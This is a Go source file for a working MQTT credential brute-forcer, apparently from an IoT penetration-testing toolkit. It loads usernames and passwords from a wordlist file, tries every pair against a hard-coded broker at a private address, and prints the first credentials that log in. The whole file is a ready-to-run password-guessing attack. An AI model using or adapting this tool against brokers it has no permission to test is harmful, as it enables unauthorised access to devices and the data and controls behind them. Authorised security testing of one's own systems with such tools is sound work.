package main

import (
	"bufio"
	"fmt"
	MQTT "github.com/eclipse/paho.mqtt.golang"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/gosuri/uilive"
)

func readFile(filename string) []string {
	var data []string
	f, err := os.Open(filename)

	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		data = append(data, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return data
}

func Brute(opts *MQTT.ClientOptions,usernames []string, passwords []string){
	fmt.Printf("Try")
	totalLength := len(usernames) * len(passwords)
	counter := 1
	for _, username := range usernames {
		for _, password := range passwords {
			opts.Username = username
			opts.Password = password
			client := MQTT.NewClient(opts)
			if token := client.Connect(); token.Wait() && token.Error() != nil {
				//log.Printf("Error: %v", token.Error())
				fmt.Fprintf(writer, "Attempt... (%d/%d)\n", counter, totalLength)
				counter += 1
				time.Sleep(100*time.Millisecond)
			} else {
				fmt.Fprintf(writer, "Get valid Credentials\nLogin: %s\nPassword: %s\n", username, password)
				return
			}
		}
	}
}
var writer = uilive.New()

func main() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		log.Println("\r- Ctrl+C pressed in Terminal")
		os.Exit(0)
	}()

	usernames := readFile("exploitation/bruteforce/passwords.txt")
	passwords := readFile("exploitation/bruteforce/passwords.txt")
	opts := MQTT.NewClientOptions().AddBroker("tcp://192.168.0.218:1883").SetClientID("bruteforce")
	opts.SetCleanSession(true)


	// start listening for updates and render
	writer.Start()
	Brute(opts, usernames, passwords)
	writer.Stop()
}
